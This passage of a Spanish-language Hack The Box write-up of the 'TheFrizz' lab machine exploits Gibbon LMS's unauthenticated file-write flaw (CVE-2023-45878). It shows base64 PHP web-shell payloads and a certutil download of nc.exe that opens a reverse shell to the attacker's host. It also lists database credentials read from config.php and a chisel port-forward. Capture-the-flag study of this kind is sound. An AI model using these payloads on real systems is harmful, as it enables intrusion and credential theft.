<p>En el caso de <a href="https://github.com/GibbonEdu/core/blob/v25.0.00/modules/Rubrics/rubrics_visualise_saveAjax.php#L20"><code>rubrics_visualise_saveAjax.php</code></a> no necesita autenticacion. Muestra que necesita tres paremetros a traves del metodo POST, con estos permitiria la creacion de un archivo.</p>
<p>El parametro <code>img</code> debe de estar codificado en base64 este seria el contenido del archivo, <code>path</code>, la direccion con el nombre del archivo a guardar y <code>gibbonPersonID</code> un valor numerico. De ser exitosa la creacion este retornaria el direccion y nombre del archivo.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// [...]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="k">require_once</span> <span class="s2">&#34;../../../gibbon.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$img</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;img&#39;</span><span class="p">]</span> <span class="o">??</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$imgPath</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">]</span> <span class="o">??</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$gibbonPersonID</span> <span class="o">=</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;gibbonPersonID&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nx">str_pad</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;gibbonPersonID&#39;</span><span class="p">],</span> <span class="mi">10</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">,</span> <span class="nx">STR_PAD_LEFT</span><span class="p">)</span> <span class="o">:</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$absolutePath</span> <span class="o">=</span> <span class="nv">$gibbon</span><span class="o">-&gt;</span><span class="na">session</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;absolutePath&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$img</span><span class="p">)</span> <span class="o">||</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$gibbonPersonID</span><span class="p">)</span> <span class="o">||</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$absolutePath</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Decode raw image data
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">list</span><span class="p">(</span><span class="nv">$type</span><span class="p">,</span> <span class="nv">$img</span><span class="p">)</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;;&#39;</span><span class="p">,</span> <span class="nv">$img</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">list</span><span class="p">(,</span> <span class="nv">$img</span><span class="p">)</span>      <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span> <span class="nv">$img</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$img</span> <span class="o">=</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$img</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Create an uploads path if one isn&#39;t supplied
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$imgPath</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$fileUploader</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Gibbon\FileUploader</span><span class="p">(</span><span class="nv">$pdo</span><span class="p">,</span> <span class="nv">$gibbon</span><span class="o">-&gt;</span><span class="na">session</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$imgPath</span> <span class="o">=</span> <span class="nv">$fileUploader</span><span class="o">-&gt;</span><span class="na">getUploadsFolderByDate</span><span class="p">()</span><span class="o">.</span><span class="s1">&#39;/rubric_visualisation_&#39;</span><span class="o">.</span><span class="nv">$gibbonPersonID</span><span class="o">.</span><span class="s1">&#39;.png&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Ensure destination folder exists
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$destinationFolder</span> <span class="o">=</span> <span class="nv">$absolutePath</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nx">dirname</span><span class="p">(</span><span class="nv">$imgPath</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">is_dir</span><span class="p">(</span><span class="nv">$destinationFolder</span><span class="p">)</span> <span class="o">==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">mkdir</span><span class="p">(</span><span class="nv">$destinationFolder</span><span class="p">,</span> <span class="mo">0755</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Write image data
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$fp</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="nv">$absolutePath</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$imgPath</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nv">$img</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Return image path to AJAX
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="nv">$imgPath</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="creating-a-file">Creating a File</h2>
<p>Intentamos acceder <strong>a traves del LFI</strong> pero nos muestra un mensaje de error, seguramente por intentar incluir <code>gibbon.php</code>.</p>
<p><img alt="image" src="/images/posts/htb/thefrizz/2025_20134271457.png"><br />
<img alt="image" src="/images/posts/htb/thefrizz/2025_20134271827.png"></p>
<p>Sin embargo, podemos acceder a este archivo directamente.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">â¯ curl -sI http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php
</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
</span></span><span class="line"><span class="cl">Date: Fri, <span class="m">28</span> Mar <span class="m">2025</span> 07:24:29 GMT
</span></span><span class="line"><span class="cl">Server: Apache/2.4.58 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/3.1.3 PHP/8.2.12
</span></span><span class="line"><span class="cl">Set-Cookie: <span class="nv">G60fa1cd0af7be78b</span><span class="o">=</span>6dqoa1l6f417hvf3jr3uspv6ua<span class="p">;</span> <span class="nv">path</span><span class="o">=</span>/<span class="p">;</span> HttpOnly<span class="p">;</span> <span class="nv">SameSite</span><span class="o">=</span>Lax
</span></span><span class="line"><span class="cl">X-Frame-Options: SAMEORIGIN
</span></span><span class="line"><span class="cl">Pragma: no-cache
</span></span><span class="line"><span class="cl">Cache-Control: max-age<span class="o">=</span>0, no-cache, no-store, must-revalidate
</span></span><span class="line"><span class="cl">Expires: Thu, <span class="m">1</span> Jan <span class="m">1970</span> 00:00:00 GMT
</span></span><span class="line"><span class="cl">Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">â¯ 
</span></span></code></pre></td></tr></table>
</div>
</div><p>Creamos el contenido PHP de nuestro archivo y lo codificamos en base64.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># &lt;?php phpinfo();</span>
</span></span><span class="line"><span class="cl"><span class="nv">PD9waHAgcGhwaW5mbygpOw</span><span class="o">==</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Enviamos la solicitud POST para crear un archivo con el nombre <code>test.php</code>, la respuesta muestra el nombre del archivo, por lo que fue exitoso.</p>
<p><img alt="image" src="/images/posts/htb/thefrizz/2025_20134272558.png"></p>
<p>Tras acceder al archivo observamos que se ejecuto el contenido php.</p>
<p><img alt="image" src="/images/posts/htb/thefrizz/2025_20134272652.png"></p>
<h2 id="command-execution">Command Execution</h2>
<p>Intentamos ejecutar un ping a nuestra maquina.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># &lt;?php system(&#34;ping 10.10.14.105&#34;);</span>
</span></span><span class="line"><span class="cl"><span class="c1"># PD9waHAgc3lzdGVtKCJwaW5nIDEwLjEwLjE0LjEwNSIpOw==</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">â¯ curl -X POST <span class="s2">&#34;http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php&#34;</span> -H <span class="s2">&#34;Content-Type: application/x-www-form-urlencoded&#34;</span> -d <span class="s2">&#34;img=data:image/png;base64,PD9waHAgc3lzdGVtKCJwaW5nIDEwLjEwLjE0LjEwNSIpOw==&#34;</span> -d <span class="nv">path</span><span class="o">=</span>ping.php -d <span class="nv">gibbonPersonID</span><span class="o">=</span><span class="m">1</span> -x <span class="s2">&#34;http://127.0.0.1:8080&#34;</span>
</span></span><span class="line"><span class="cl">ping.php
</span></span><span class="line"><span class="cl">â¯
</span></span></code></pre></td></tr></table>
</div>
</div><p>Tras visitar el archivo se ejecuto el ping.</p>
<p><img alt="image" src="/images/posts/htb/thefrizz/2025_20134273044.png"></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">â¯ sudo tcpdump -i tun0 icmp
</span></span><span class="line"><span class="cl">tcpdump: verbose output suppressed, use -v<span class="o">[</span>v<span class="o">]</span>... <span class="k">for</span> full protocol decode
</span></span><span class="line"><span class="cl">listening on tun0, link-type RAW <span class="o">(</span>Raw IP<span class="o">)</span>, snapshot length <span class="m">262144</span> bytes
</span></span><span class="line"><span class="cl">02:27:31.600035 IP frizzdc.frizz.htb &gt; 10.10.14.105: ICMP <span class="nb">echo</span> request, id 1, seq 5, length <span class="m">40</span>
</span></span><span class="line"><span class="cl">02:27:31.600067 IP 10.10.14.105 &gt; frizzdc.frizz.htb: ICMP <span class="nb">echo</span> reply, id 1, seq 5, length <span class="m">40</span>
</span></span><span class="line"><span class="cl">02:27:32.508379 IP frizzdc.frizz.htb &gt; 10.10.14.105: ICMP <span class="nb">echo</span> request, id 1, seq 6, length <span class="m">40</span>
</span></span><span class="line"><span class="cl">02:27:32.508419 IP 10.10.14.105 &gt; frizzdc.frizz.htb: ICMP <span class="nb">echo</span> reply, id 1, seq 6, length <span class="m">40</span>
</span></span><span class="line"><span class="cl">02:27:33.422383 IP frizzdc.frizz.htb &gt; 10.10.14.105: ICMP <span class="nb">echo</span> request, id 1, seq 7, length <span class="m">40</span>
</span></span><span class="line"><span class="cl">02:27:33.422402 IP 10.10.14.105 &gt; frizzdc.frizz.htb: ICMP <span class="nb">echo</span> reply, id 1, seq 7, length <span class="m">40</span>
</span></span><span class="line"><span class="cl">02:27:34.336385 IP frizzdc.frizz.htb &gt; 10.10.14.105: ICMP <span class="nb">echo</span> request, id 1, seq 8, length <span class="m">40</span>
</span></span><span class="line"><span class="cl">02:27:34.336404 IP 10.10.14.105 &gt; frizzdc.frizz.htb: ICMP <span class="nb">echo</span> reply, id 1, seq 8, length <span class="m">40</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>Update</strong>: esta vulnerabilidad ya estaba reportada como <a href="https://herolab.usd.de/security-advisories/usd-2023-0025/">CVE-2023-45878</a></p>
<div class="tenor-gif-embed" data-postid="20070311" data-share-method="host" data-aspect-ratio="1.77778" data-width="15%"></div> <script type="text/javascript" async src="https://tenor.com/embed.js"></script>
<h1 id="user---wwebservice">User - w.webservice</h1>
<p>Ejecutamos una shell inversa descargando netcat en la maquina y ejecutando este.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># PHP code</span>
</span></span><span class="line"><span class="cl"><span class="c1"># &lt;?php system(&#34;certutil.exe -urlcache -split -f http://10.10.14.105/nc.exe nc.exe &amp;&amp; .\\nc.exe -e cmd.exe 10.10.14.105 1338&#34;);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># base64</span>
</span></span><span class="line"><span class="cl"><span class="c1"># PD9waHAgc3lzdGVtKCJjZXJ0dXRpbC5leGUgLXVybGNhY2hlIC1zcGxpdCAtZiBodHRwOi8vMTAuMTAuMTQuMTA1L25jLmV4ZSBuYy5leGUgJiYgLlxcbmMuZXhlIC1lIGNtZC5leGUgMTAuMTAuMTQuMTA1IDEzMzgiKTs=</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">â¯ <span class="nv">EXEC</span><span class="o">=</span><span class="k">$(</span>curl -sX POST <span class="s2">&#34;http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php&#34;</span> -H <span class="s2">&#34;Content-Type: application/x-www-form-urlencoded&#34;</span> -d <span class="s2">&#34;img=data:image/png;base64,PD9waHAgc3lzdGVtKCJjZXJ0dXRpbC5leGUgLXVybGNhY2hlIC1zcGxpdCAtZiBodHRwOi8vMTAuMTAuMTQuMTA1L25jLmV4ZSBuYy5leGUgJiYgLlxcbmMuZXhlIC1lIGNtZC5leGUgMTAuMTAuMTQuMTA1IDEzMzgiKTs=&#34;</span> -d <span class="s2">&#34;gibbonPersonID=1&#34;</span> -d <span class="nv">path</span><span class="o">=</span>sc.php<span class="k">)</span><span class="p">;</span> curl -s <span class="s1">&#39;http://frizzdc.frizz.htb/Gibbon-LMS/&#39;</span><span class="nv">$EXEC</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Logramos el acceso a la maquina a traves de este usuario.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">â¯ rlwrap nc -lvp <span class="m">1338</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">1338</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.101<span class="o">]</span> from frizz.htb <span class="o">[</span>10.10.11.60<span class="o">]</span> <span class="m">50215</span>
</span></span><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 10.0.20348.3207<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. All rights reserved.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\G</span>ibbon-LMS&gt;whoami
</span></span><span class="line"><span class="cl">whoami
</span></span><span class="line"><span class="cl">frizz<span class="se">\w</span>.webservice
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\G</span>ibbon-LMS&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>En el archivo de configuracion de Gibbon encontramos las credenciales para la base de datos.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\G</span>ibbon-LMS&gt;type config.php <span class="p">|</span> findstr /v <span class="s2">&#34;*&#34;</span>
</span></span><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">Gibbon, Flexible <span class="p">&amp;</span> Open School System
</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>C<span class="o">)</span> 2010, Ross Parker
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">This program is free software: you can redistribute it and/or modify
</span></span><span class="line"><span class="cl">it under the terms of the GNU General Public License as published by
</span></span><span class="line"><span class="cl">the Free Software Foundation, either version <span class="m">3</span> of the License, or
</span></span><span class="line"><span class="cl"><span class="o">(</span>at your option<span class="o">)</span> any later version.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">This program is distributed in the hope that it will be useful,
</span></span><span class="line"><span class="cl">but WITHOUT ANY WARRANTY<span class="p">;</span> without even the implied warranty of
</span></span><span class="line"><span class="cl">MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
</span></span><span class="line"><span class="cl">GNU General Public License <span class="k">for</span> more details.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">You should have received a copy of the GNU General Public License
</span></span><span class="line"><span class="cl">along with this program.  If not, see &lt;http://www.gnu.org/licenses/&gt;.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$databaseServer</span> <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$databaseUsername</span> <span class="o">=</span> <span class="s1">&#39;MrGibbonsDB&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$databasePassword</span> <span class="o">=</span> <span class="s1">&#39;MisterGibbs!Parrot!?1&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$databaseName</span> <span class="o">=</span> <span class="s1">&#39;gibbon&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$guid</span> <span class="o">=</span> <span class="s1">&#39;7y59n5xz-uym-ei9p-7mmq-83vifmtyey2&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$caching</span> <span class="o">=</span> 10<span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\G</span>ibbon-LMS&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Sin embargo por alguna razon no fue posible conectarnos a la base de datos localmente.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">C:<span class="se">\x</span>ampp<span class="se">\m</span>ysql<span class="se">\b</span>in&gt;mysql.exe -u MrGibbonsDB -p<span class="s2">&#34;MisterGibbs!Parrot!?1&#34;</span> -D gibbson
</span></span><span class="line"><span class="cl">mysql.exe -u MrGibbonsDB -p<span class="s2">&#34;MisterGibbs!Parrot!?1&#34;</span> -D gibbson
</span></span><span class="line"><span class="cl">ERROR <span class="m">1044</span> <span class="o">(</span>42000<span class="o">)</span>: Access denied <span class="k">for</span> user <span class="s1">&#39;MrGibbonsDB&#39;</span>@<span class="s1">&#39;localhost&#39;</span> to database <span class="s1">&#39;gibbson&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:<span class="se">\x</span>ampp<span class="se">\m</span>ysql<span class="se">\b</span>in&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="port-forwarding---chisel">Port Forwarding - Chisel</h2>
<p>Ejecutamos chisel como servidor en nuestra maquina.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">â¯ ./chisel server --reverse --port <span class="m">7070</span>
</span></span><span class="line"><span class="cl">2025/03/28 02:48:02 server: Reverse tunnelling enabled
</span></span><span class="line"><span class="cl">2025/03/28 02:48:02 server: Fingerprint //rsQs0pJozZwwmq0K8mAWEYkFDkmZ9ayBFNvvO9Xr4<span class="o">=</span>
</span></span><span class="line"><span class="cl">2025/03/28 02:48:02 server: Listening on http://0.0.0.0:7070
</span></span><span class="line"><span class="cl">2025/03/28 02:49:00 server: session#1: tun: proxy#R:3306<span class="o">=</span>&gt;3306: Listening
</span></span></code></pre></td></tr></table>
</div>
</div><p>Descargamos y ejecutamos chisel en la maquina para obtener el puerto 3306.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\G</span>ibbon-LMS<span class="se">\t</span>m&gt;certutil.exe -urlcache -split -f http://10.10.14.105/chisel.exe
</span></span><span class="line"><span class="cl">certutil.exe -urlcache -split -f http://10.10.14.105/chisel.exe
</span></span><span class="line"><span class="cl">****  Online  ****
</span></span><span class="line"><span class="cl">  <span class="m">000000</span>  ...
</span></span><span class="line"><span class="cl">  94f000
</span></span><span class="line"><span class="cl">CertUtil: -URLCache <span class="nb">command</span> completed successfully.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\G</span>ibbon-LMS<span class="se">\t</span>m&gt;chisel.exe client 10.10.14.105:7070 R:3306
</span></span><span class="line"><span class="cl">chisel.exe client 10.10.14.105:7070 R:3306
</span></span><span class="line"><span class="cl">2025/03/28 00:53:54 client: Connecting to ws://10.10.14.105:7070
</span></span><span class="line"><span class="cl">2025/03/28 00:53:56 client: Connected <span class="o">(</span>Latency 237.3903ms<span class="o">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Observamos el puerto localmente.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">â¯ netstat -ntpl
</span></span><span class="line"><span class="cl"><span class="o">(</span>Not all processes could be identified, non-owned process info
</span></span><span class="line"><span class="cl"> will not be shown, you would have to be root to see it all.<span class="o">)</span>
</span></span><span class="line"><span class="cl">Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
</span></span><span class="line"><span class="cl">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:38707         0.0.0.0:*               LISTEN      101546/chrome --dis 
</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:8080          :::*                    LISTEN      7143/java           
</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:40581         :::*                    LISTEN      7143/java           
</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> :::3306                 :::*                    LISTEN      126262/./chisel     
</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> :::7070                 :::*                    LISTEN      126262/./chisel     
</span></span><span class="line"><span class="cl">â¯
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="gibbon-database">Gibbon Database</h2>
<p>Con ello, localmente logramos acceder a MySQL con las credenciales.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
